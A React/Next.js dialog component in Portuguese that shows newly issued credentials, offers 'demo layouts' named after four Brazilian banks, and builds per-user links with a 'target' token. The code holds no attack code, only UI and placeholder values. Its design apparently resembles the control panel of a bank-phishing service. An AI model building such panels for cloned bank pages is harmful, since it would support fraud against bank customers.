"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import {
  Dialog,
  DialogClose,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog"
import {
  Alert,
  AlertDescription,
  AlertTitle,
} from "@/components/ui/alert"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Access } from "@/types/access"

import { downloadCredencials } from "@/functions/downloadCredencials"
import { Separator } from "../ui/separator"
import { AlertCircleIcon, CheckCircle2Icon, PopcornIcon, Eye, EyeOff } from "lucide-react"
import Link from "next/link"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "../ui/select"

interface FormDialogProps {
  open: boolean
  onOpenChange: (open: boolean) => void
}

export function TokenDialog({ open, onOpenChange }: FormDialogProps) {
  const [showToken, setShowToken] = useState(false);
  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>Cadastro</DialogTitle>
          <DialogDescription>
            Cadastro realizado com sucesso!
          </DialogDescription>
          <Alert variant="destructive">
            <AlertCircleIcon />
            <AlertTitle>As credenciais são exibidas apenas uma vez.</AlertTitle>
            <AlertDescription>
              <p>
                Certifique-se de salvá-las em um local seguro — não será possível acessá-las novamente mais tarde.
              </p>
            </AlertDescription>
          </Alert>
        </DialogHeader>
        <div className="grid gap-4 mt-4">
          <div className="grid gap-2 text-sm">
            <h5 className="font-semibold text-neutral-700 mb-1">Credenciais</h5>
            <div className="grid grid-cols-2 justify-start gap-2 mt-3">
              <div>
                <Label htmlFor="username" className="text-neutral-500 mb-2">
                  Username:
                </Label>
                <Input
                  id="username"
                  className="text-neutral-600 font-medium"
                  defaultValue="raul"
                  readOnly
                />
              </div>
              <div>
                <Label htmlFor="token" className="text-neutral-500 mb-2 block">
                  Token:
                </Label>
                <div className="relative">
                  <Input
                    id="token"
                    type={showToken ? "text" : "password"}
                    className="text-neutral-600 font-medium pr-10"
                    defaultValue="jasjdakdh728"
                    readOnly
                  />
                  <button
                    type="button"
                    onClick={() => setShowToken(!showToken)}
                    className="absolute right-2 top-1/2 -translate-y-1/2 text-neutral-500 hover:text-neutral-700 cursor-pointer"
                    aria-label={showToken ? "Esconder token" : "Mostrar token"}
                  >
                    {showToken ? <EyeOff size={18} /> : <Eye size={18} />}
                  </button>
                </div>
              </div>
            </div>
            <div className="grid grid-cols-1 justify-start gap-2 mt-2">
              <Label className="text-neutral-500">
                Layout demo:
              </Label>
              <Select>
                <SelectTrigger className="w-100">
                  <SelectValue placeholder="Selecione o Layout Demo" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="inter">Banco Inter</SelectItem>
                  <SelectItem value="nubank">Nubank</SelectItem>
                  <SelectItem value="bradesco">Bradesco</SelectItem>
                  <SelectItem value="caixa">Caixa</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div className="grid grid-cols-1 justify-start gap-2 mt-2">
              <Label htmlFor="url" className="text-neutral-500">
                URL:
              </Label>
              <Input
                id="url"
                className="text-neutral-600 font-medium"
                defaultValue="https://dominio.com/demo?page=inter&target=jasjdakdh728"
                readOnly
              />
            </div>
            <div className="grid grid-cols-1 justify-start gap-2 mt-2">
              <Label htmlFor="urlParam" className="text-neutral-500">
                Parâmetro de URL:
              </Label>
              <Input
                id="urlParam"
                className="text-neutral-600 font-medium"
                defaultValue="?target=jasjdakdh728"
                readOnly
              />
            </div>
          </div>
        </div>
        <DialogFooter className="sm:justify-start mt-4">
          <Button
            type="button"
            // variant={"outline"}
            className="cursor-pointer"
            onClick={() => downloadCredencials({
              username: "raul",
              token: "jasjdakdh728",
              url: "https://dominio.com/content?target=jasjdakdh728",
              url_param: "?target=jasjdakdh728"
            })}>
            Baixar Credenciais
          </Button>
          <Link href={"/dashboard"}>
            <Button
              type="button"
              variant={"outline"}
              className="cursor-pointer"
            >
              Acessar Painel
            </Button>
          </Link>
        </DialogFooter>
      </DialogContent>
    </Dialog>
  )
}